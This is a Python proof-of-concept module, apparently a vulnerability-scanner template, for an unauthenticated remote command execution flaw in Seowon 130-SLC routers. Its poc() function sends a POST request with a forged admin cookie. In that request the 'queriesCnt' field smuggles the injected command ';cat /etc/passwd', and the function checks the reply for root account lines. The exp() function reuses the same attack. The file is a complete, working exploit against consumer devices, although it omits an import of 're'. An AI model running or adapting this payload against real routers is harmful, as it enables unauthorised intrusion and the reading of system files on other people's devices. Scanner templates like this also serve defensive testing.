import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Seowon 130-SLC router -  Remote Code Execution''',
        "description": '''Execute commands without authentication as admin user, To use it in all versions, we only enter the router ip & Port(if available) in the request The result of the request is visible on the browser page''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/50295"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "seowon", "router", "unauth", "iot"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "POST"
        data = """Command=Diagnostic&traceMode=trace&reportIpOnly=0&pingPktSize=56&pingTimeout=30&pingCount=4&ipAddr=&maxTTLCnt=30&queriesCnt=;cat /etc/passwd&reportIpOnlyCheckbox=on&btnApply=Apply&T=1631653402928"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte; cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0; cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0; cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url